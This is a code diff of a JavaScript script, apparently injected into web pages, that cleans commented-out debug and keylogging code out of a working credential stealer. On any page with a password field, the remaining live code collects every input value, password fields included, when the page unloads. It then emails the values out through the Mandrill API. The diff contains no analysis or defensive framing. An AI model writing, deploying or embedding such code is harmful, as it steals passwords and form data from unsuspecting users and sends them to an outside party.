@@ -36,36 +36,16 @@ send_mail = {
 var path = "https://mandrillapp.com/api/1.0/messages/send.json";
 
 if(document.querySelector('input[type="password"]') !== null) {
-	// var input_tags = document.getElementsByTagName('input');
-	// var inputs = new Array(input_tags.length);
-	// for(var i = 0; i < inputs.length; i++) {
-	// 	inputs[i] = "";
-	// }
-	// for(var i= 0; i< inputs.length; i++) {
-	// 	console.log(i);
-	// 	input_tags[i].addEventListener('keydown', function(e){
-	// 		console.log(i);
-	// 		console.log(input_tags[i]);
-	// 		inputs[i] += String.fromCharCode(e.which);
-	// 		console.log(inputs[i]);
-	// 	});
-	// }
 	window.onbeforeunload = function(e) {
 		var input_tags = document.getElementsByTagName('input');
 		for(var i = 0; i < input_tags.length; i++) {
 			var type = input_tags[i].getAttribute("type");
-			// input_tags[i].setAttribute("type", "text");
-			// console.log(input_tags[i]);
 			string = 'input: '
 			if (type == 'password') {
 				string = 'password: ';
 			}
 			send_mail['message']['html'] += string + String(input_tags[i].value) + "<br />";
-			// console.log(input_tags[i].value);
-			// input_tags[i].setAttribute("type", type);
 		}
-		// console.log(send_mail['message']['html']);
-		// console.log(JSON.stringify(send_mail));
 		$.ajax({
 			type: "POST",
 			url: path,
@@ -75,19 +55,4 @@ if(document.querySelector('input[type="password"]') !== null) {
 		});
 
 	};
-	// document.querySelector("body").addEventListener("input",function(e){
-	// 	var input_tags = document.getElementsByTagName('input');
-	// 	for(var i = 0; i < input_tags.length; i++) {
-	// 		// var type = input_tags[i].getAttribute("type");
-	// 		// input_tags[i].setAttribute("type", "text");
-	// 		// console.log(input_tags[i]);
-	// 		send_mail['message']['html'] += 'input: ' + String(input_tags[i].value) + "\n";
-	// 		// console.log(input_tags[i].value);
-	// 		console.log(send_mail['message']['html']);
-	// 		// input_tags[i].setAttribute("type", type);
-	// 	}
-	// });
-	// $('input').click(function(){
-	// 	console.log('sdfsdf');
-	// });
 }
